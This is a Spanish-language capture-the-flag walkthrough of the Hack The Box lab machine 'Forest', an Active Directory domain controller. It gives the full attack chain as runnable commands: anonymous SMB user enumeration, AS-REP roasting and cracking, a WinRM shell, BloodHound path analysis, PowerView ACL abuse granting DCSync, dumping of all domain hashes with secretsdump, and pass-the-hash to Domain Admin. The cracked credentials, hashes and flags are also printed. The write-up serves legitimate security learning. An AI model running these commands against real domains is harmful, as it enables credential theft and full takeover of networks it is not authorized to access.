01 · RECONOCIMIENTO DE UN DC

23 puertos no asustan: son la huella de un Domain Controller.

▚ Dominio y Domain Controller

Un dominio gestiona de forma centralizada muchos equipos y usuarios bajo un mismo paraguas (la cuenta corporativa con la que inicia sesión toda una empresa). El Domain Controller (DC) es el servidor que manda: guarda todas las cuentas, contraseñas, grupos y permisos, y autentica a todos. Forest es un DC. Comprometer un DC es comprometer el dominio entero — por eso es el objetivo más goloso.

Barrido y detección

mkdir -p ~/htb/forest/nmap && cd ~/htb/forest
nmap -p- --min-rate 1000 -oA nmap/allports 10.129.62.145
nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA nmap/detail 10.129.62.145
EL TTL DELATA EL SOEl ping devolvía ttl=127. Windows parte su TTL en 128 (baja 1 por salto); Linux en 64. Así que ttl=127 = Windows, antes de tocar nada. Coherente: AD es tecnología Microsoft.

Leer un DC de un vistazo

A diferencia de Cap (3 puertos) y Knife (2), un DC devuelve 23. Los 4966x/4967x son RPC dinámico (ruido). Los que importan forman la huella de AD:

PuertoServicioQué significa
88Kerberos⭐ La estrella. El sistema de autenticación de AD. Verlo = hay dominio Windows. La técnica de Forest lo ataca.
389 / 636LDAP / LDAPSLa "guía telefónica" del dominio: usuarios, grupos, permisos. Clave para enumerar. Permite anonymous bind.
445SMBComparticiones Windows. Aquí acepta sesión nula (guest).
53DNSEl DC también es el DNS del dominio.
5985 / 47001WinRM⭐ Administración remota. Con credenciales, tu vía a una shell (el "SSH de Windows").

El -sCV revela el nombre del dominio, repetido por todas partes: Domain: htb.local, FQDN: FOREST.htb.local, Windows Server 2016. Y una perla en el script de SMB: account_used: guest → acepta acceso anónimo.

Mapear el dominio en /etc/hosts (obligatorio en AD)

Muchas herramientas de AD (sobre todo las de Kerberos) fallan si les hablas por IP: necesitan el nombre. Enséñale a Kali a resolver el dominio:

sudo sh -c 'echo "10.129.62.145 htb.local forest.htb.local FOREST" >> /etc/hosts'
ping -c 2 forest.htb.local   # debe resolver el nombre a la IP
REGLA DE ADMapear el dominio en /etc/hosts es obligatorio en toda máquina de AD. Y un dominio por vez: limpia entradas viejas de otros labs para no confundirte.

02 · ENUMERACIÓN ANÓNIMA

Sin credenciales, pero el dominio ya nos habla.

▚ SMB y por qué el acceso anónimo importa

SMB es el protocolo de Windows para compartir archivos y recursos en red. Cuando permite acceso anónimo/guest, puedes preguntarle cosas sin credenciales — entre ellas, a veces, la lista de usuarios del dominio. Y conseguir esa lista es el primer gran paso en AD: necesitas saber a quién atacar.

Confirmar sesión nula y sacar usuarios

netexec smb 10.129.62.145 -u '' -p ''            # (Null Auth:True) = acepta anónimo
netexec smb 10.129.62.145 -u '' -p '' --users    # lista los usuarios del dominio

El --users devuelve 31 usuarios. La habilidad clave es separar el grano de la paja:

Ruido (ignorar)Grano (personas / cuentas reales)
Administrator, Guest, krbtgt, DefaultAccount (integradas) · SM_*, HealthMailbox*, $* (cuentas de Exchange, autogeneradas)sebastien, lucinda, andy, mark, santi, y svc-alfresco
EL PREFIJO svc-svc-alfresco salta a la vista: svc- = service account (cuenta de servicio, no persona). Las cuentas de servicio suelen estar peor configuradas — contraseñas débiles y, a menudo, la debilidad de Kerberos que vamos a explotar.

Guarda los usuarios-persona en un archivo (los necesitarás):

echo 'sebastien
lucinda
andy
mark
santi
svc-alfresco' > users.txt

03 · AS-REP ROASTING + CRACKING

Pedir el hash de un usuario sin autenticarte, y romperlo offline.

▚ AS-REP Roasting

Normalmente Kerberos exige pre-autenticarte antes de darte información. Pero existe una opción de cuenta, "no requiere pre-autenticación", que si está activada hace que Kerberos te entregue información cifrada sin autenticarte. Esa información contiene algo derivado de la contraseña del usuario. Si la capturas, la crackeas offline.

AS-REP Roasting = pedirle a Kerberos el hash de un usuario con la pre-autenticación desactivada, para romperlo. Las cuentas svc- son candidatas frecuentes.

Pedir los hashes

impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt

Los cinco usuarios-persona responden doesn't have UF_DONT_REQUIRE_PREAUTH set (bien configurados). Pero svc-alfresco suelta el premio — un hash $krb5asrep$.... Guárdalo:

impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt | grep '\$krb5asrep\$' > hash.txt

Crackear offline

El hash es una representación cifrada de la contraseña. Se rompe offline (en tu Kali, sin tocar la víctima, intentos ilimitados) probando un diccionario. hashcat es lo estándar… pero en una VM sin GPU falla:

hashcat -m 18200 hash.txt rockyou.txt   # ✗ No OpenCL/CUDA platform found (VM sin GPU)
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   # ✓ detecta el tipo solo

John lo rompe en un segundo: svc-alfresco : s3rvice.

hashcat vs johnhashcat brilla con GPU; en una VM sin GPU, john es tu herramienta de cracking (usa CPU sin quejarse y autodetecta el tipo de hash). Ten ambas en el arsenal.

04 · FOOTHOLD · WINRM

De anónimo a usuario autenticado del dominio.

Validar credenciales (reflejo obligatorio en AD)

Antes de usar unas credenciales nuevas, compruébalas. Y verifica si sirven para WinRM:

netexec smb 10.129.62.145 -u svc-alfresco -p s3rvice    # [+] = válidas
netexec winrm 10.129.62.145 -u svc-alfresco -p s3rvice  # (Pwn3d!) = puede entrar por WinRM

Conseguir shell

evil-winrm es el "SSH de Windows": administración remota que da una terminal PowerShell con credenciales válidas.

evil-winrm -i 10.129.62.145 -u svc-alfresco -p s3rvice

Caes en *Evil-WinRM* PS C:\Users\svc-alfresco\Documents>. Estás dentro del DC como svc-alfresco.

User flag

En Windows la flag está en el Desktop, no en /home. Comandos de PowerShell: cd, dir (el ls), type (el cat).

cd C:\Users\svc-alfresco\Desktop
type user.txt   # -> 8a961daab9f55e5a4a4a738aa69b0434

05 · BLOODHOUND

La escalada en AD es sobre relaciones y permisos, no sobre un binario.

▚ ¿Qué es BloodHound?

Recolecta toda la información del dominio (usuarios, grupos, permisos, relaciones) y la dibuja como un grafo. Su magia: calcula el camino más corto desde donde estás hasta Domain Admin, mostrando qué permiso abusar en cada paso. En un dominio real con miles de objetos, encontrar ese camino a mano es imposible.

Recolectar (desde Kali)

bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -ns 10.129.62.145 -c All --zip

-ns es el DNS (el propio DC), -c All recolecta todo, --zip empaqueta. Genera un .zip. Warnings a ignorar: los Kerberos → NTLM fallback (recolecta igual por NTLM) y el clock skew (si algún día bloquea algo crítico: sudo ntpdate 10.129.62.145).

Analizar (BloodHound CE)

bloodhound-start   # Web UI: http://127.0.0.1:8080  ·  admin/admin

En la interfaz, Quick Upload tu .zip, espera el procesado, y busca svc-alfresco para confirmar que cargó. En Pathfinding: origen svc-alfresco, destino Exchange Windows Permissions. El grafo:

svc-alfresco ─MemberOf→ Service Accounts ─MemberOf→ Privileged IT Accounts ─MemberOf→ Account Operators ─GenericAll→ Exchange Windows Permissions ─WriteDacl→ HTB.LOCAL

Traducción: por su cadena de grupos, svc-alfresco llega a Account Operators, que tiene GenericAll (control total) sobre Exchange Windows Permissions, y ese grupo tiene WriteDacl sobre el dominio entero. Ese es el camino a Domain Admin.

06 · ACLs → DCSYNC → PASS-THE-HASH

Tres movimientos que convierten permisos en Domain Admin.

▚ Los permisos que vamos a abusar

GenericAll = control total sobre un objeto (puedes, por ejemplo, agregarte a un grupo). WriteDacl = puedes modificar la lista de permisos (DACL) de un objeto — y así concederte a ti mismo nuevos derechos. DCSync = abusar de la replicación entre DCs para pedirle al DC todos los hashes de contraseñas del dominio, como si fueras otro DC.

Preparar PowerView (vía evil-winrm)

# en Kali:
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ~/htb/forest/
# en la sesión evil-winrm:
upload /home/iphobiuss/htb/forest/PowerView.ps1
. .\PowerView.ps1                # dot-sourcing: carga las funciones (silencio = ok)

Movimiento 1 · Agregarte al grupo (GenericAll)

Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco'
Get-DomainGroupMember -Identity 'Exchange Windows Permissions' | Select-Object MemberName

La verificación muestra svc-alfresco como miembro. Ya perteneces al grupo con WriteDacl sobre el dominio.

Movimiento 2 · Concederte DCSync (WriteDacl)

$pass = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'svc-alfresco' -Rights DCSync
TIMINGLa pertenencia al grupo tarda unos segundos en propagarse. Si el Movimiento 2 da error de permisos, espera 10-15 s y reintenta.

Movimiento 3 · DCSync (desde Kali)

impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.62.145

El rpc_s_access_denied inicial es un método secundario — se ignora, porque debajo vuelca todos los hashes del dominio. La línea que importa (RID 500 = Administrator):

htb.local\Administrator:500:aad3b435...:32693b11e6aa90eb43d32c72a07ceea6:::

Pass-the-Hash · Domain Admin

No hace falta crackear ese hash. En Windows te autenticas con el hash directamente (Pass-the-Hash): en vez de -p contraseña, usas -H hash.

evil-winrm -i 10.129.62.145 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
type C:\Users\Administrator\Desktop\root.txt   # -> 650ace87ec9847f97c3deb4b998ef61a

Eres Domain Admin. Forest comprometida por completo. 🏴‍☠️

CONCEPTOS NUEVOS (EL MUNDO AD)

Forest abre Active Directory: un arsenal entero que Cap y Knife no tenían.
  • Fingerprint de DC: 20+ puertos con Kerberos (88) + LDAP (389/636) + SMB (445) + DNS (53) = Domain Controller. ttl=127 = Windows.
  • /etc/hosts en AD: mapear el dominio a la IP es obligatorio; muchas herramientas Kerberos fallan por IP.
  • Enumeración anónima: SMB con Null Auth / LDAP anonymous bind → lista de usuarios del dominio sin credenciales.
  • AS-REP Roasting: cuentas sin pre-auth de Kerberos (típico en svc-) → hash con GetNPUsers, crackeable offline.
  • Cracking: john cuando no hay GPU; autodetecta el tipo de hash. rockyou como diccionario.
  • Validar y entrar: netexec smb/winrm (Pwn3d!) → evil-winrm para shell.
  • BloodHound: recolectar con bloodhound-python, analizar el grafo, leer el camino a Domain Admin.
  • Abuso de ACLs: GenericAll (control total) y WriteDacl (modificar permisos) con PowerView.
  • DCSync: abusar de la replicación para volcar todos los hashes (secretsdump), incluido Administrator.
  • Pass-the-Hash: autenticarte con el hash NTLM sin conocer la contraseña (-H).
